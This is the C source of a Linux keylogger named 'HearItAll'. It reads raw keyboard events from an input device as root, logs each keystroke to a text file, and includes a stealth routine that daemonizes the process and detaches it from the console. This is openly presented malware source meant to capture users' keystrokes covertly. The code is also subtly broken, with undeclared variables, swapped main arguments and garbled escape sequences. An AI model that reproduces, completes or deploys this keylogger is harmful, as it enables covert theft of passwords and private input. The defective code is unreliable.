#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>

/*
 * DEBUG global var
 *
 * When is activated the windows does not stealth 
 * and some output will appear on it
 */
const int DEBUG = 1;

const char* keymap[] = 
{ 
    "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "[BACKSPACE]", "\t", "q", "w", "e", "r", "t", "y", "u", "i", "o",
    "p", "[", "]", "\n", "[CTRL]", "a", "s", "d", "f", "g", "h", "j",
    "k", "l", ";", "'", "`", "[SHIFT]", "\\", "z", "x", "c", "v", "b", "n",
    "m", ",", ".", "/", "[SHIFT]", "\0", "\0", " ", "[CAPSLOCK]", "[F1]", 
    "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
    "[NUMLOCK]", "[SCROLLLOCK]", "[HOME]", "[UP]", "[PG UP]", "-", "[LEFT]",
    "5", "[RTARROW]", "+", "[END]", "[DOWN]", "[PG DOWN]", "[INS]", "[DEL]",
    "\0", "\0", "\0", "[F11]", "[F12]", "\0", "\0", "\0", "\0", "\0", "\0", 
    "\0", "\n", "[CTRL]", "/", "[PRTSCR]", "[ALT]", "\0", "[HOME]",
    "[UP]", "[PG UP]", "[LEFT]", "[RIGHT]", "[END]", "[DOWN]", "[PG DOWN]",
    "[INSERT]", "[DEL]", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "[PAUSE]"
};

char *LOG_PATH_NAME = "LOG.txt";

// Function headers
void stealth();
void initialize(FILE *file);
char* currentDateTime();

int main(char** argv, int argc) 
{
    if(!DEBUG)
        //stealth();
    char i;

    // Opens the stream
    FILE *output_file;
    output_file = fopen(LOG_PATH_NAME, "a");

    initialize(output_file);

    struct input_event ev[64];
    int fd, rd, value, size = sizeof (struct input_event);
    char name[256] = "Unknown";

    /*
     * The path to input device
     * Change this to work with your keyboard input event
     *
     * To see what is that event open the terminal and type this:
     *     cd /dev/input/by-path
     *     ls -la
     */
    char *device = "/dev/input/event3";

    if ((getuid()) != 0)
        printf("You need to be root!");

    // Open Device
    if ((fd = open(device, O_RDONLY)) == -1)
        printf("%s is not a vaild device.n", device);

    // Print Device Name
    if(DEBUG) 
    {
        ioctl(fd, EVIOCGNAME (sizeof(name)), name);
        fprintf(output_file, "Reading From : %s (%s)n", device, name);
    }
    // Main loop
    while (1)
    {
        if ((rd = read(fd, ev, size * 64)) < size)
            perror_exit("read()");      

        value = ev[0].value;

        // Only read the key press event
        if (value != ' ' && ev[1].value == 1 && ev[1].type == 1) {
            fprintf(file, "%s", keymap[key_stroke]);
            if (DEBUG) 
                printf("%s", keymap[key_stroke]);

        }
    }

    return 0;
}

// Stealth the console 
void stealth(void)
{
    pid = fork();
    if(pid < 0)
    {
        // Report error and exit
        printf("Error while forking.\n");
        exit(1);
    }

    if(pid == 0)
    {
        // The child becomes the daemon
        // Detach all standard I/O descriptors
        close(0);
        close(1);
        close(2);
        // Enter a new session
        setsid();
        // We are now daemonized
    }

    else
    {
        // The parent need not exist anymore
        exit(0);
    }
}

// Initializes LOG.txt file with some info for the session
void initialize(FILE *file)
{
    char* dateTime = currentDateTime();
    fprintf(file, "\n\n");
    fprintf(file, "**********************************************************\n");
    fprintf(file, "****               HearItAll Keylogger                ****\n");
    fprintf(file, "****                 (Linux version)                  ****\n");
    fprintf(file, "****--------------------------------------------------****\n");
    fprintf(file, "****                                                  ****\n");
    fprintf(file, "****    Created by: Ander Granado                     ****\n");
    fprintf(file, "****                                                  ****\n");
    fprintf(file, "**********************************************************\n");
    fprintf(file, "****   Timestamp: %s            ****\n", dateTime);
    fprintf(file, "**********************************************************\n\n");
}

char* currentDateTime(void)
{
    time_t rawtime;
    struct tm * timeinfo;
    char *strDateTime;

    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strDateTime = asctime(timeinfo);

    //char *final;
    //strncpy(final, strDateTime, strlen(strDateTime)-1);

    strDateTime[strlen(strDateTime) - 1] = '\0';

    return strDateTime;
}